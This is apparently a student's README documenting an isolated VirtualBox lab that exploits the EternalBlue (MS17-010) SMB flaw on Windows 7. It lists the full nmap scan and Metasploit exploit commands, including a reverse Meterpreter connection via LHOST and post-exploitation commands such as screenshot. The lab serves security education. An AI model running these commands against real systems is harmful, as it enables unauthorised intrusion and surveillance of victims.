# 🛡️ Lab 1: EternalBlue (MS17-010) Vulnerability & Exploitation

Welcome to my cybersecurity lab documentation! This repository documents a controlled, step-by-step penetration testing lab focusing on the critical **MS17-010 (EternalBlue)** vulnerability.

---

## 💻 Lab Environment
- **Attacker Machine:** Kali Linux
- **Target Machine:** Windows 7 Home Basic (Isolated VirtualBox VM)
- **Tools Used:** Nmap, Metasploit Framework

---

## 🚀 Step-by-Step Execution

### Step 1: Network & Vulnerability Scanning (Nmap)
First, I scanned the target machine to check if the SMB service (Port 445) was open and if it was vulnerable to MS17-010.

########Exploitation (Metasploit Framework)
```bash
nmap -p 445 --script smb-vuln-ms17-010 192.168.233.130
msfconsole
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS 192.168.233.130
set LHOST 192.168.233.74
exploit

#################### Post-Exploitation & Control (Meterpreter)
sysinfo       # To check OS details
getuid        # To check system privileges
screenshot    # To capture the target's screen

### 📸 Lab Screenshot
![Lab Scan Result](screenshots/final_scan.png)
